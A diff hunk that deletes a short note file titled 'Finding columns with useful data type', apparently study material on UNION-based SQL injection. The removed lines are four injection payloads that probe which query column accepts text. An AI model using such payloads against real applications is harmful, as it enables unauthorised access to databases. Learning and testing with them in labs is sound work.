@@ -1,8 +1,0 @@
-##Finding columns with useful data type
-#THEORY
-' UNION SELECT 'a',NULL,NULL,NULL--
-' UNION SELECT NULL,'a',NULL,NULL--
-' UNION SELECT NULL,NULL,'a',NULL--
-' UNION SELECT NULL,NULL,NULL,'a'--
-
-
